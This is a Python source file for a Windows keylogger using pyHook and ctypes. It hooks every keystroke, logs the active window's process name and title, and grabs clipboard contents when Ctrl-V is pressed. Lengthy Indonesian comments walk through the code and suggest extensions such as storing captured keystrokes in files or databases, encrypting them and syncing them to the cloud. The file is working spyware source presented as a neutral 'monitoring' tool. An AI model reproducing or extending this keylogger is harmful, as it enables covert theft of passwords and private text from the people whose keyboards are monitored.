from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read it's title
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=' ')
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % pasted_value, end=' ')
        else:
            print("[%s]" % event.Key, end=' ')

    # pass execution to next hook registered 
    return True


# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  # 
# Program ini adalah sebuah script Python yang menggunakan beberapa modul Windows untuk memantau aktivitas keyboard pengguna dan menangkap teks yang diketik serta mengambil isi dari clipboard ketika ada perubahan.

# Berikut adalah alur programnya:

# Import modul yang diperlukan, yaitu ctypes, pythoncom, pyHook, dan win32clipboard.

# Mendefinisikan beberapa objek yang diperlukan untuk berinteraksi dengan sistem Windows, seperti user32, kernel32, dan psapi. current_window digunakan untuk melacak jendela saat ini.

# Fungsi get_current_process() digunakan untuk mendapatkan informasi tentang proses yang sedang berjalan di jendela saat ini. Ini mencakup mendapatkan ID proses, nama executable, dan judul jendela saat ini.

# Fungsi KeyStroke(event) digunakan sebagai callback yang akan dipanggil setiap kali ada keystroke yang terdeteksi. Fungsi ini akan mencetak keystroke yang terjadi. Jika ada perubahan jendela aktif, fungsi get_current_process() akan dipanggil untuk mencetak informasi tentang proses yang sedang berjalan di jendela tersebut. Jika keystroke adalah [Ctrl-V], maka isi dari clipboard akan diambil dan dicetak.

# Objek HookManager dari pyHook dibuat dan KeyDown-nya diatur untuk memanggil fungsi KeyStroke setiap kali ada keystroke yang terdeteksi.

# Hook keyboard diaktifkan dengan memanggil HookKeyboard() dari HookManager.

# pythoncom.PumpMessages() digunakan untuk memastikan bahwa proses berjalan selamanya (sampai dihentikan secara paksa).

# Dengan demikian, program ini berfungsi untuk mencetak keystroke yang terjadi, serta menampilkan informasi tentang proses yang sedang berjalan di jendela aktif dan isi dari clipboard saat [Ctrl-V] ditekan.

# ================================================================================================================================================================================================================================================== # 

# Fungsi-fungsi dalam Program:
# get_current_process():

# Manfaat: Fungsi ini digunakan untuk mendapatkan informasi tentang proses yang sedang berjalan di jendela aktif, seperti ID proses, nama executable, dan judul jendela.
# Cara Penggunaan: Dipanggil setiap kali ada perubahan jendela aktif untuk mencetak informasi tentang proses yang sedang berjalan.
# Pengembangan: Fungsi ini bisa diperluas untuk menyimpan informasi proses ke dalam struktur data, melakukan analisis lebih lanjut terhadap proses yang sedang berjalan, atau menambahkan fungsionalitas lain terkait manajemen proses.
# KeyStroke(event):

# Manfaat: Fungsi ini digunakan sebagai callback setiap kali ada keystroke yang terdeteksi. Ia mencetak keystroke yang terjadi serta mengambil isi dari clipboard jika [Ctrl-V] ditekan.
# Cara Penggunaan: Dipanggil setiap kali ada keystroke yang terdeteksi untuk mencetak keystroke tersebut atau mengambil isi clipboard jika [Ctrl-V] ditekan.
# Pengembangan: Fungsi ini bisa diperluas untuk melakukan pemrosesan lebih lanjut terhadap keystroke, menyimpan keystroke ke dalam file log, atau menambahkan fungsionalitas lain terkait manajemen keystroke.

# Manfaat Program:
# -Memantau Aktivitas Keyboard Pengguna: Program ini memungkinkan untuk memantau dan mencatat setiap keystroke yang dimasukkan oleh pengguna.
# -Mendapatkan Informasi Proses Aktif: Program ini juga memberikan informasi tentang proses yang sedang berjalan di jendela aktif, seperti nama executable dan judul jendela.
# -Mengambil Isi Clipboard: Program ini dapat mengambil dan mencetak isi dari clipboard ketika [Ctrl-V] ditekan.

# Cara Penggunaan:
# -Jalankan program Python ini di lingkungan Windows.
# -Setelah dijalankan, program akan mulai memantau keystroke yang dimasukkan oleh pengguna.
# -Informasi tentang proses yang sedang berjalan di jendela aktif akan dicetak ketika terjadi perubahan jendela.
# -Ketika [Ctrl-V] ditekan, program akan mengambil dan mencetak isi dari clipboard.

# Pengembangan:
# -Penyimpanan Data:
# -Data keystroke dan informasi proses dapat disimpan ke dalam basis data atau file untuk analisis lebih lanjut.

# Antarmuka Pengguna:
# -Dapat dibuat antarmuka pengguna grafis (GUI) untuk memudahkan pengguna dalam melihat dan mengelola data yang dipantau.

# Enkripsi dan Keamanan:
# -Data yang dipantau bisa dienkripsi untuk keamanan tambahan.

# Fungsionalitas Tambahan:
# -Menambahkan kemampuan untuk memblokir keystroke tertentu atau mengirim notifikasi ketika keystroke tertentu terdeteksi.
# -Integrasi dengan layanan cloud untuk menyimpan data secara terenkripsi dan sinkronisasi di berbagai perangkat.

# Optimisasi dan Kinerja:
# -Memperbaiki performa dan efisiensi program untuk meminimalkan penggunaan sumber daya sistem.



